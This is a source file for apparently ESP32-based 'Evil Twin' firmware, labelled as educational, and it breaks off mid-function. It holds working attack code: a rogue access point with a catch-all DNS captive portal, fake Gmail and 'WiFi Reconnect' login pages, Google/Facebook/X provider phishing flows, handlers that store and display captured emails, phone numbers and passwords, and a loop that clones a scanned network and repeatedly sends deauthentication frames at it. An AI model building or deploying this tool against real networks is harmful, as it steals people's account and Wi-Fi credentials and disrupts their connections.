// Educational Evil Twin - Authorized penetration testing only
#include "evil_twin.h"
#include "config.h"
#include "icon.h"
#include <DNSServer.h>
#include <WebServer.h>
#include "evil_twin_portal_html.h"
namespace EvilTwin {

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer webServer(80);

char customSSID[33] = "Free_WiFi";
int ssidLen = 9;
const char charset[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_- >";
int charIndex = 0;
const int charsetLen = 66;

bool serverActive = false;
int evilTwinMode = 0;
bool modeSelected = false;

Preferences evilPrefs;

// Mode 2 config state
int portalLanguage = 0; // 0 = English, 1 = Tagalog
bool enableGoogle = true;
bool enableFacebook = true;
bool enableTwitter = true;
bool portalConfigured = false;
int configIndex = 0;

// Mode 0 preset state
int presetIndex = 0;
int presetScroll = 0;
bool presetChosen = false;
bool useCustomSSID = false;

// Mode 1 scan/deauth state
const int MAX_SCAN = 20;
wifi_ap_record_t scanList[MAX_SCAN];
int scanCount = 0;
int scanIndex = 0;
int scanScroll = 0;
bool scanDone = false;
bool targetSelected = false;
uint8_t targetChannel = 1;
uint8_t targetBSSID[6];
uint8_t deauthFrame[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                           0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
                           0xCC, 0xCC, 0xCC, 0xCC, 0x00, 0x00, 0x01, 0x00};
uint32_t lastDeauthTime = 0;

// Credential storage
const int MAX_CAPTURES = 10;
CapturedCredential captures[MAX_CAPTURES];
int captureCount = 0;
int captureScrollIndex = 0;
bool newCredentials = false;
bool logsLoaded = false;

void saveCaptureToNVS(int idx) {
  evilPrefs.begin("eviltwin", false);
  evilPrefs.putUInt("capCount", captureCount);
  String capKey = "cap" + String(idx);
  String data = captures[idx].mode + "|" + captures[idx].type + "|" + captures[idx].value + "|" + captures[idx].password + "|" + captures[idx].provider + "|" + captures[idx].ssid;
  evilPrefs.putString(capKey.c_str(), data);
  evilPrefs.end();
}

void loadCapturesFromNVS() {
  evilPrefs.begin("eviltwin", true);
  captureCount = evilPrefs.getUInt("capCount", 0);
  if (captureCount > MAX_CAPTURES) captureCount = MAX_CAPTURES;
  for (int i = 0; i < captureCount; i++) {
    String capKey = "cap" + String(i);
    String data = evilPrefs.getString(capKey.c_str(), "");
    int sep1 = data.indexOf('|');
    int sep2 = data.indexOf('|', sep1 + 1);
    int sep3 = data.indexOf('|', sep2 + 1);
    int sep4 = data.indexOf('|', sep3 + 1);
    int sep5 = data.indexOf('|', sep4 + 1);
    
    if (sep1 > 0 && sep2 > 0 && sep3 > 0 && sep4 > 0 && sep5 > 0) {
      captures[i].mode = data.substring(0, sep1);
      captures[i].type = data.substring(sep1 + 1, sep2);
      captures[i].value = data.substring(sep2 + 1, sep3);
      captures[i].password = data.substring(sep3 + 1, sep4);
      captures[i].provider = data.substring(sep4 + 1, sep5);
      captures[i].ssid = data.substring(sep5 + 1);
      captures[i].timestamp = 0;
    }
  }
  evilPrefs.end();
}

unsigned long lastDebounceTime = 0;
const unsigned long debounceDelay = 200;

// ---- HTML: Mode 0 Phone Portal ----
const char html_phone[] PROGMEM = R"rawliteral(

<!DOCTYPE html><html><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>Email</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:"Google Sans",roboto,"Noto Sans Myanmar UI",arial,sans-serif}
body{display:flex;flex-direction:column;justify-content:center;align-items:center;min-height:100vh;background-color:#f1f1f1}
.login-container{width:100%;max-width:400px;margin:auto;padding:20px;border:1px solid #e9e9e9;border-radius:25px;margin-top:50px;background-color:#fff;box-shadow:0 0 10px rgba(0,0,0,0.1)}
#logo{display:block;margin:0 auto 20px;text-align:center;font-size:48px}
h2{color:#1f1f1f;margin-bottom:20px;font-weight:400}
h6{color:#1f1f1f;margin-bottom:20px;font-weight:400;font-size:0.67em}
.g-input{display:block;width:100%;padding:10px;margin-bottom:10px;border:1px solid #ddd;border-radius:5px;font-size:16px}
.g-input.error{border-color:#d93025;background-color:#fce8e6}
.g-input.valid{border-color:#0f9d58;background-color:#e6f4ea}
.error-message{color:#d93025;font-size:12px;margin-top:-8px;margin-bottom:10px;margin-left:5px;display:none}
.error-message.show{display:block}
.gbtn-primary{display:block;width:100px;padding:10px;border:none;border-radius:55px;background-color:#1a73e8;color:#fff;cursor:pointer;max-width:200px!important;float:right;font-size:14px;font-weight:500}
.gbtn-primary:hover{background-color:#1557b0}
.gbtn-primary:disabled{background-color:#a8c7fa;cursor:not-allowed}
.g-footer{margin-top:100px;text-align:center;font-size:12px;color:#a0a0a0;width:100%;max-width:400px;display:flex;justify-content:center;flex-wrap:wrap;gap:10px}
.g-footer a{color:#a0a0a0;text-decoration:none;margin:0 5px;font-size:12px}
.g-footer a:hover{text-decoration:underline}
.success-msg{display:none;color:#28a745;text-align:center;margin-top:20px;font-size:14px;font-weight:500}
.spinner{margin:15px auto;width:30px;height:30px;border:4px solid #f3f3f3;border-top:4px solid #007bff;border-radius:50%;animation:spin 1s linear infinite;display:none}
@keyframes spin{to{transform:rotate(360deg)}}
.hint{color:#5f6368;font-size:11px;margin-top:-5px;margin-bottom:15px;margin-left:5px}
</style></head><body>
<div class="login-container">
<form id="f" autocomplete="on">
<div id="logo">
<svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg></div>
<h2>Sign in</h2>
<h6>Go to Gmail</h6>
<input name="email" type="text" class="g-input" id="ei" placeholder="Email or phone" required autofocus>
<div id="ee" class="error-message"></div>
<div class="hint">Enter your Gmail address or phone number</div>
<input name="password" type="password" class="g-input" placeholder="Password" required>
<h6 style="color:#a0a0a0">Not on your computer? Use a private window to sign in.</h6>
<button class="gbtn-primary" type="submit" id="sb" disabled>Next</button>
</form>
<div id="sp" class="spinner"></div>
<div id="sm" class="success-msg"></div>
</div>
<div class="g-footer">
<a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Settings</a><a href="#">About</a>
</div><br>
<script>
var ei=document.getElementById('ei'),ee=document.getElementById('ee'),sb=document.getElementById('sb'),f=document.getElementById('f');
var gp=/^[a-zA-Z0-9._%+-]+@gmail\.com$/,pp=/^09\d{9}$/;
function v(i){
var c=i.replace(/\s/g,'');
if(c.includes('@')){
if(gp.test(c))return{v:true,t:'email'};
if(c.endsWith('@gmail.com'))return{v:false,m:'Invalid Gmail address format. Please check your username.'};
return{v:false,m:'Please enter a valid @gmail.com address.'};
}
if(/^[\d\s]+$/.test(c)){
var d=c.replace(/\s/g,'');
if(d.length===0)return{v:false,m:''};
if(!d.startsWith('09'))return{v:false,m:'Phone number must start with 09.'};
if(d.length<11){var r=11-d.length;return{v:false,m:'Phone number must be 11 digits. Need '+r+' more digit'+(r>1?'s':'')+'.'};}
if(d.length>11)return{v:false,m:'Phone number must be exactly 11 digits. Too many digits.'};
if(pp.test(d))return{v:true,t:'phone'};
}
if(c.length>0&&/[a-zA-Z]/.test(c)&&/\d/.test(c)&&!c.includes('@'))return{v:false,m:'Please enter a valid Gmail address or 11-digit phone number starting with 09.'};
return{v:false,m:'Please enter a valid Gmail address or phone number.'};
}
ei.oninput=function(){
var r=v(this.value);
this.classList.remove('error','valid');
ee.classList.remove('show');
sb.disabled=true;
if(this.value.length===0)return;
if(r.v){this.classList.add('valid');sb.disabled=false;}
else{this.classList.add('error');ee.textContent=r.m;ee.classList.add('show');}
};
ei.onblur=function(){
var r=v(this.value);
if(this.value.length>0&&!r.v){this.classList.add('error');ee.textContent=r.m;ee.classList.add('show');}
};
f.onsubmit=function(e){
e.preventDefault();
var r=v(ei.value);
if(!r.v){ei.classList.add('error');ee.textContent=r.m;ee.classList.add('show');ei.focus();return;}
var p=document.querySelector('input[name="password"]').value;
this.style.display='none';
document.getElementById('sp').style.display='block';
document.getElementById('sm').style.display='block';
document.getElementById('sm').innerText='Signing in...';
var x=new XMLHttpRequest();
x.open('POST','/login',true);
x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
x.onload=function(){
if(x.status===200){
document.getElementById('sp').style.display='none';
document.getElementById('sm').innerText='Connected! Redirecting...';
document.getElementById('sm').style.color='#28a745';
setTimeout(function(){window.location.href='https://www.google.com';},3000);
}
};
x.send('email='+encodeURIComponent(ei.value)+'&password='+encodeURIComponent(p));
};
</script></body></html>

)rawliteral";

// ---- HTML: Mode 1 WiFi Password Portal (no signal emoji) ----
const char html_password[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WiFi Reconnect</title>
<style>
body{font-family:'Segoe UI',sans-serif;background:#f4f4f4;margin:0;display:flex;align-items:center;justify-content:center;height:100vh}
.c{background:#fff;padding:30px;border-radius:12px;box-shadow:0 8px 16px rgba(0,0,0,.1);width:90%;max-width:400px;text-align:center}
h2{color:#333;margin-bottom:5px}
.al{background:#fff3cd;border:1px solid #ffc107;border-radius:6px;padding:12px;margin-bottom:20px;color:#856404;font-size:13px;text-align:left}
.fg{text-align:left;margin-bottom:15px}
label{display:block;color:#555;margin-bottom:5px;font-weight:600;font-size:14px}
input[type=password]{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;font-size:16px}
.btn{background:#007bff;color:#fff;border:none;padding:14px;width:100%;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer;margin-top:10px}
.ft{margin-top:20px;font-size:12px;color:#aaa}
.st{color:#007bff;font-size:16px;font-weight:700;margin-top:15px;display:none}
.sp{margin:15px auto;width:30px;height:30px;border:4px solid #f3f3f3;border-top:4px solid #007bff;border-radius:50%;animation:s 1s linear infinite;display:none}
@keyframes s{to{transform:rotate(360deg)}}
</style></head><body><div class="c">
<h2>WiFi Reconnection Required</h2>
<div class="al">Your session has expired. Please re-enter your WiFi password to reconnect.</div>
<form id="f"><div class="fg"><label>WiFi Password</label>
<input type="password" id="pw" name="wifipass" placeholder="Enter your WiFi password" required>
</div><button type="submit" class="btn">Reconnect</button></form>
<div id="sp" class="sp"></div><div id="st" class="st"></div>
<div class="ft">Secure connection provided by your network administrator.</div>
</div><script>
document.getElementById('f').onsubmit=function(e){e.preventDefault();
var p=document.getElementById('pw').value;
document.getElementById('f').style.display='none';
document.getElementById('sp').style.display='block';
document.getElementById('st').style.display='block';
document.getElementById('st').innerText='Validating connection...';
var x=new XMLHttpRequest();x.open('POST','/login',true);
x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
x.send('wifipass='+encodeURIComponent(p));
setTimeout(function(){document.getElementById('sp').style.display='none';
document.getElementById('st').innerText='Connected! Redirecting...';
document.getElementById('st').style.color='#28a745';},3000);};
</script></body></html>
)rawliteral";

// ---- Web Handlers ----
void handleRoot() {
  if (evilTwinMode == 0)
    webServer.send(200, "text/html", html_phone);
  else if (evilTwinMode == 1)
    webServer.send(200, "text/html", html_password);
  else {
    String html = (portalLanguage == 1) ? String(FPSTR(html_provider_selection_tl)) : String(FPSTR(html_provider_selection_en));
    String gBtn = enableGoogle ? (portalLanguage == 1 ? "<a href=\"/google\" class=\"btn btn-google\">Magpatuloy gamit ang Google</a>" : "<a href=\"/google\" class=\"btn btn-google\">Continue with Google</a>") : "";
    String fBtn = enableFacebook ? (portalLanguage == 1 ? "<a href=\"/facebook\" class=\"btn btn-facebook\">Magpatuloy gamit ang Facebook</a>" : "<a href=\"/facebook\" class=\"btn btn-facebook\">Continue with Facebook</a>") : "";
    String tBtn = enableTwitter ? (portalLanguage == 1 ? "<a href=\"/twitter\" class=\"btn btn-twitter\">Magpatuloy gamit ang X</a>" : "<a href=\"/twitter\" class=\"btn btn-twitter\">Continue with X</a>") : "";
    html.replace("%GOOGLE_BTN%", gBtn);
    html.replace("%FACEBOOK_BTN%", fBtn);
    html.replace("%TWITTER_BTN%", tBtn);
    webServer.send(200, "text/html", html);
  }
}

void handleLogin() {
  if (evilTwinMode == 0) {
    // Mode 0: Capture email/phone AND password
    String email = webServer.hasArg("email") ? webServer.arg("email") : "";
    String password =
        webServer.hasArg("password") ? webServer.arg("password") : "";

    if (email.length() > 0 && captureCount < MAX_CAPTURES) {
      captures[captureCount] = {"email", email, "", "", String(customSSID), millis(), "Phone"};
      captureCount++;
      saveCaptureToNVS(captureCount - 1);
      newCredentials = true;
      Serial.println("--- CAPTURED (Email) ---");
      Serial.print("Email: ");
      Serial.println(email);
    }

    if (password.length() > 0 && captureCount < MAX_CAPTURES) {
      captures[captureCount] = {"password", password, "", "", String(customSSID),
                                millis(), "Phone"};
      captureCount++;
      saveCaptureToNVS(captureCount - 1);
      newCredentials = true;
      Serial.println("--- CAPTURED (Password) ---");
      Serial.print("Password: ");
      Serial.println(password);
    }
  } else if (evilTwinMode == 1) {
    // Mode 1: Capture WiFi password (unchanged)
    if (webServer.hasArg("wifipass") && captureCount < MAX_CAPTURES) {
      captures[captureCount] = {"password", webServer.arg("wifipass"), "", "",
                                String(customSSID), millis(), "WiFi Password"};
      captureCount++;
      saveCaptureToNVS(captureCount - 1);
      newCredentials = true;
      Serial.println("--- CAPTURED (Password) ---");
      Serial.print("Pass: ");
      Serial.println(webServer.arg("wifipass"));
    }
  }
  webServer.send(200, "text/plain", "OK");
}

void handleProviderLogin() {
  String provider = webServer.hasArg("provider") ? webServer.arg("provider") : "";
  String username = webServer.hasArg("username") ? webServer.arg("username") : "";
  String password = webServer.hasArg("password") ? webServer.arg("password") : "";

  if (provider.length() > 0 && username.length() > 0 && password.length() > 0 && captureCount < MAX_CAPTURES) {
    captures[captureCount] = {"provider_login", username, password, provider, String(customSSID), millis(), "Provider Login"};
    captureCount++;
    saveCaptureToNVS(captureCount - 1);
    newCredentials = true;
    Serial.println("--- CAPTURED (Provider Login) ---");
    Serial.print("Provider: "); Serial.println(provider);
    Serial.print("User: "); Serial.println(username);
  }
  webServer.send(200, "text/plain", "OK");
}

void handleGoogle() {
  if (!enableGoogle) { webServer.send(404, "text/plain", "Not Found"); return; }
  if (portalLanguage == 1) webServer.send(200, "text/html", html_google_login_tl);
  else webServer.send(200, "text/html", html_google_login_en);
}

void handleFacebook() {
  if (!enableFacebook) { webServer.send(404, "text/plain", "Not Found"); return; }
  if (portalLanguage == 1) webServer.send(200, "text/html", html_facebook_login_tl);
  else webServer.send(200, "text/html", html_facebook_login_en);
}

void handleTwitter() {
  if (!enableTwitter) { webServer.send(404, "text/plain", "Not Found"); return; }
  if (portalLanguage == 1) webServer.send(200, "text/html", html_twitter_login_tl);
  else webServer.send(200, "text/html", html_twitter_login_en);
}

void handleSuccess() {
  if (portalLanguage == 1) webServer.send(200, "text/html", html_fake_success_tl);
  else webServer.send(200, "text/html", html_fake_success_en);
}

// ---- Server Start (Mode 0: normal AP, Mode 1: cloned AP + deauth init) ----
void startServer() {
  if (evilTwinMode == 1) {
    // Mode 1: Clone target AP on same channel
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(customSSID, NULL, targetChannel);
    esp_wifi_set_max_tx_power(82);
    // Prepare deauth frame with target BSSID
    memcpy(&deauthFrame[10], targetBSSID, 6);
    memcpy(&deauthFrame[16], targetBSSID, 6);
    lastDeauthTime = 0;
  } else {
    // Mode 0: Normal open AP
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(customSSID);
  }
  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.on("/", HTTP_GET, handleRoot);
  webServer.on("/login", HTTP_POST, handleLogin);
  webServer.on("/google", HTTP_GET, handleGoogle);
  webServer.on("/facebook", HTTP_GET, handleFacebook);
  webServer.on("/twitter", HTTP_GET, handleTwitter);
  webServer.on("/success", HTTP_GET, handleSuccess);
  webServer.on("/api/capture", HTTP_POST, handleProviderLogin);
  webServer.onNotFound(handleRoot);
  webServer.begin();
  serverActive = true;
  setNeoPixelColour("red");
  Serial.print("Evil Twin on SSID: ");
  Serial.println(customSSID);
  Serial.print("Mode: ");
  Serial.println(evilTwinMode == 0 ? "Phone" : "WiFi Pass + Deauth");
}

// ---- Send Deauth Burst (Mode 1 only, called in server loop) ----
void sendDeauth() {
  if (evilTwinMode != 1)
    return;
  unsigned long now = millis();
  if (now - lastDeauthTime >= 100) {
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
    lastDeauthTime = now;
  }
}

// ---- Mode Selection Menu ----
void drawModeMenu() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(10, 10, "Evil Twin Mode:");
  u8g2.setFont(u8g2_font_5x8_tr);
  if (evilTwinMode == 0) { u8g2.drawBox(0, 16, 128, 10); u8g2.setDrawColor(0); }
  u8g2.drawStr(4, 24, "0: Phone Harvesting"); u8g2.setDrawColor(1);
  if (evilTwinMode == 1) { u8g2.drawBox(0, 26, 128, 10); u8g2.setDrawColor(0); }
  u8g2.drawStr(4, 34, "1: WiFi Password"); u8g2.setDrawColor(1);
  if (evilTwinMode == 2) { u8g2.drawBox(0, 36, 128, 10); u8g2.setDrawColor(0); }
  u8g2.drawStr(4, 44, "2: Provider Login"); u8g2.setDrawColor(1);
  if (evilTwinMode == 3) { u8g2.drawBox(0, 46, 128, 10); u8g2.setDrawColor(0); }
  u8g2.drawStr(4, 54, "3: View Logs"); u8g2.setDrawColor(1);
  u8g2.drawStr(0, 63, "R: Confirm | C: Exit");
  u8g2.sendBuffer();
}

void handleModeInput() {
  unsigned long now = millis();
  if (now - lastDebounceTime > debounceDelay) {
    if (digitalRead(BUTTON_UP_PIN) == LOW) {
      evilTwinMode = (evilTwinMode + 3) % 4;
      lastDebounceTime = now;
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
      evilTwinMode = (evilTwinMode + 1) % 4;
      lastDebounceTime = now;
    } else if (digitalRead(BTN_PIN_RIGHT) == LOW) {
      modeSelected = true;
      lastDebounceTime = now;
    }
  }
}

// ---- Mode 2: Portal Configuration Menu ----
void drawMode2ConfigMenu() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_5x8_tr);
  u8g2.drawStr(0, 8, "Portal Setup:");
  
  String langStr = "Lang: " + String(portalLanguage == 0 ? "[EN]" : "[TL]");
  String gStr = "Google: " + String(enableGoogle ? "[ON]" : "[OFF]");
  String fStr = "Facebook: " + String(enableFacebook ? "[ON]" : "[OFF]");
  String tStr = "Twitter: " + String(enableTwitter ? "[ON]" : "[OFF]");
  
  if (configIndex == 0) u8g2.drawStr(0, 20, ">");
  u8g2.drawStr(8, 20, langStr.c_str());
  
  if (configIndex == 1) u8g2.drawStr(0, 30, ">");
  u8g2.drawStr(8, 30, gStr.c_str());
  
  if (configIndex == 2) u8g2.drawStr(0, 40, ">");
  u8g2.drawStr(8, 40, fStr.c_str());
  
  if (configIndex == 3) u8g2.drawStr(0, 50, ">");
  u8g2.drawStr(8, 50, tStr.c_str());
  
  if (configIndex == 4) { u8g2.drawBox(4, 54, 50, 10); u8g2.setDrawColor(0); }
  u8g2.drawStr(6, 62, "Continue");
  u8g2.setDrawColor(1);
  u8g2.sendBuffer();
}

void handleMode2ConfigInput() {
  unsigned long now = millis();
  if (now - lastDebounceTime > debounceDelay) {
    if (digitalRead(BUTTON_UP_PIN) == LOW) {
      if (configIndex > 0) configIndex--;
      lastDebounceTime = now;
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
      if (configIndex < 4) configIndex++;
      lastDebounceTime = now;
    } else if (digitalRead(BTN_PIN_LEFT) == LOW || digitalRead(BTN_PIN_RIGHT) == LOW || digitalRead(BUTTON_SELECT_PIN) == LOW) {
      if (configIndex == 0) portalLanguage = 1 - portalLanguage;
      else if (configIndex == 1) enableGoogle = !enableGoogle;
      else if (configIndex == 2) enableFacebook = !enableFacebook;
      else if (configIndex == 3) enableTwitter = !enableTwitter;
      else if (configIndex == 4) {
        portalConfigured = true;
      }
      lastDebounceTime = now;
    }
  }
}

// ---- Mode 0: Preset SSID Menu ----
void drawPresetMenu() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_5x8_tr);
  u8g2.drawStr(0, 8, "Select SSID:");
  int visible = 5;
  for (int i = 0; i < visible; i++) {
    int idx = presetScroll + i;
    if (idx >= SSID_PRESET_COUNT)
      break;
    int y = 20 + i * 10;
    if (idx == presetIndex)
      u8g2.drawStr(0, y, ">");
    u8g2.drawStr(8, y, SSID_PRESETS[idx]);
  }
  if (presetScroll > 0)
    u8g2.drawStr(122, 20, "^");
  if (presetScroll + visible < SSID_PRESET_COUNT)
    u8g2.drawStr(122, 60, "v");
  u8g2.sendBuffer();
}

void handlePresetInput() {
  unsigned long now = millis();
  if (now - lastDebounceTime > debounceDelay) {
    if (digitalRead(BUTTON_UP_PIN) == LOW) {
      if (presetIndex > 0) {
        presetIndex--;
        if (presetIndex < presetScroll)
          presetScroll--;
      }
      lastDebounceTime = now;
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
      if (presetIndex < SSID_PRESET_COUNT - 1) {
        presetIndex++;
        if (presetIndex >= presetScroll + 5)
          presetScroll++;
      }
      lastDebounceTime = now;
    } else if (digitalRead(BTN_PIN_RIGHT) == LOW) {
      presetChosen = true;
      if (presetIndex == SSID_PRESET_COUNT - 1) {
        // Last item = custom keyboard
        useCustomSSID = true;
        customSSID[0] = '\0';
        ssidLen = 0;
      } else {
        strncpy(customSSID, SSID_PRESETS[presetIndex], sizeof(customSSID) - 1);
        customSSID[sizeof(customSSID) - 1] = '\0';
        ssidLen = strlen(customSSID);
        startServer();
      }
      lastDebounceTime = now;
    }
  }
}

// ---- Mode 1: WiFi Scan & Target Selection ----
void doWifiScan() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(10, 30, "Scanning WiFi...");
  u8g2.sendBuffer();
  setNeoPixelColour("white");

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  int n = WiFi.scanNetworks();
  scanCount = min(n, MAX_SCAN);
  for (int i = 0; i < scanCount; i++) {
    memcpy(scanList[i].bssid, WiFi.BSSID(i), 6);
    strncpy((char *)scanList[i].ssid, WiFi.SSID(i).c_str(),
            sizeof(scanList[i].ssid));
    scanList[i].rssi = WiFi.RSSI(i);
    scanList[i].primary = WiFi.channel(i);
  }
  // Sort by RSSI descending
  for (int i = 0; i < scanCount - 1; i++)
    for (int j = i + 1; j < scanCount; j++)
      if (scanList[j].rssi > scanList[i].rssi) {
        wifi_ap_record_t tmp = scanList[i];
        scanList[i] = scanList[j];
        scanList[j] = tmp;
      }
  scanDone = true;
  scanIndex = 0;
  scanScroll = 0;
  setNeoPixelColour("0");
}

void drawScanScreen() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_5x8_tr);
  u8g2.drawStr(0, 8, "Select Target AP:");
  if (scanCount == 0) {
    u8g2.drawStr(10, 30, "No networks found");
    u8g2.drawStr(10, 42, "R: Rescan | C: Exit");
    u8g2.sendBuffer();
    return;
  }
  int visible = 5;
  for (int i = 0; i < visible; i++) {
    int idx = scanScroll + i;
    if (idx >= scanCount)
      break;
    int y = 20 + i * 10;
    if (idx == scanIndex)
      u8g2.drawStr(0, y, ">");
    String name = String((char *)scanList[idx].ssid).substring(0, 10);
    String info = name + " " + String(scanList[idx].rssi);
    u8g2.drawStr(8, y, info.c_str());
  }
  if (scanScroll > 0)
    u8g2.drawStr(122, 20, "^");
  if (scanScroll + visible < scanCount)
    u8g2.drawStr(122, 60, "v");
  u8g2.sendBuffer();
}

void handleScanInput() {
  unsigned long now = millis();
  if (now - lastDebounceTime > debounceDelay) {
    if (digitalRead(BUTTON_UP_PIN) == LOW) {
      if (scanIndex > 0) {
        scanIndex--;
        if (scanIndex < scanScroll)
          scanScroll--;
      }
      lastDebounceTime = now;
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
      if (scanIndex < scanCount - 1) {
        scanIndex++;
        if (scanIndex >= scanScroll + 5)
          scanScroll++;
      }
      lastDebounceTime = now;
    } else if (digitalRead(BTN_PIN_RIGHT) == LOW) {
      if (scanCount == 0) {
        scanDone = false; // trigger rescan
      } else {
        // Select target
        strncpy(customSSID, (char *)scanList[scanIndex].ssid,
                sizeof(customSSID) - 1);
        customSSID[sizeof(customSSID) - 1] = '\0';
        ssidLen = strlen(customSSID);
        targetChannel = scanList[scanIndex].primary;
        memcpy(targetBSSID, scanList[scanIndex].bssid, 6);
        targetSelected = true;
        startServer();
      }
      lastDebounceTime = now;
    }
  }
}

// ---- SSID Keyboard (Mode 0 custom only) ----
void drawKeyboard() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(0, 15, "Evil Twin SSID:");
  u8g2.drawStr(0, 30, customSSID);
  int strWidth = u8g2.getStrWidth(customSSID);
  char sel[2] = {charset[charIndex], '\0'};
  if (charset[charIndex] == '>') {
    u8g2.drawBox(strWidth, 21, 24, 11);
    u8g2.setDrawColor(0);
    u8g2.drawStr(strWidth + 2, 30, "RUN");
    u8g2.setDrawColor(1);
  } else {
    u8g2.drawBox(strWidth, 21, 8, 11);
    u8g2.setDrawColor(0);
    u8g2.drawStr(strWidth + 1, 30, sel);
    u8g2.setDrawColor(1);
  }
  u8g2.setFont(u8g2_font_5x8_tr);
  u8g2.drawStr(0, 50, "U/D: Change Char");
  u8g2.drawStr(0, 63, "L: Del | R: Add/Run | C: Exit");
  u8g2.sendBuffer();
}

void handleKeyboardInput() {
  unsigned long now = millis();
  if (now - lastDebounceTime > debounceDelay) {
    if (digitalRead(BUTTON_UP_PIN) == LOW) {
      charIndex = (charIndex + 1) % charsetLen;
      lastDebounceTime = now;
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
      charIndex = (charIndex - 1 + charsetLen) % charsetLen;
      lastDebounceTime = now;
    } else if (digitalRead(BTN_PIN_LEFT) == LOW) {
      if (ssidLen > 0) {
        ssidLen--;
        customSSID[ssidLen] = '\0';
      }
      lastDebounceTime = now;
    } else if (digitalRead(BTN_PIN_RIGHT) == LOW) {
      if (charset[charIndex] == '>') {
        if (ssidLen > 0)
          startServer();
      } else if (ssidLen < 31) {
        customSSID[ssidLen] = charset[charIndex];
        ssidLen++;
        customSSID[ssidLen] = '\0';
      }
      lastDebounceTime = now;
    }
  }
}

// ---- Server Active Screen ----
void drawServerScreen() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_5x8_tr);
  if (captureCount == 0) {
    u8g2.drawStr(0, 10, "Evil Twin Active");
    String modeStr = "[Phone Mode]";
    if (evilTwinMode == 1) modeStr = "[Password+Deauth]";
    else if (evilTwinMode == 2) modeStr = "[Provider Login]";
    u8g2.drawStr(0, 20, modeStr.c_str());
    u8g2.drawStr(0, 30, "SSID:");
    u8g2.drawStr(30, 30, customSSID);
    u8g2.drawStr(0, 50, "Waiting for victims...");
  } else {
    String title = "Captured Phones:";
    if (evilTwinMode == 1) title = "Captured Passwords:";
    else if (evilTwinMode == 2) title = "Captured Logins:";
    u8g2.drawStr(0, 10, title.c_str());
    int drawCount = min((evilTwinMode == 2 ? 2 : 4), captureCount - captureScrollIndex);
    for (int i = 0; i < drawCount; i++) {
      int idx = captureScrollIndex + i;
      if (evilTwinMode == 2) {
        String p = captures[idx].provider.substring(0, 1);
        p.toUpperCase();
        String u = p + ": " + captures[idx].value;
        String pw = "P: " + captures[idx].password;
        u8g2.drawStr(0, 25 + (i * 20), u.c_str());
        u8g2.drawStr(8, 35 + (i * 20), pw.c_str());
      } else {
        String prefix = (captures[idx].type == "email") ? "A" : "P";
        String s = prefix + ": " + captures[idx].value;
        u8g2.drawStr(0, 25 + (i * 10), s.c_str());
      }
    }
    if (captureScrollIndex > 0)
      u8g2.drawStr(120, 25, "^");
    if (captureScrollIndex + (evilTwinMode == 2 ? 2 : 4) < captureCount)
      u8g2.drawStr(120, 55, "v");
    setNeoPixelColour("green");
  }
  u8g2.sendBuffer();
}

// ---- Mode 3: View Logs ----
void drawViewLogsScreen() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_5x8_tr);
  if (!logsLoaded) {
    loadCapturesFromNVS();
    logsLoaded = true;
    captureScrollIndex = 0;
  }
  u8g2.drawStr(0, 10, "Stored Logs:");
  if (captureCount == 0) {
    u8g2.drawStr(0, 30, "No logs found.");
  } else {
    int drawCount = min(2, captureCount - captureScrollIndex);
    for (int i = 0; i < drawCount; i++) {
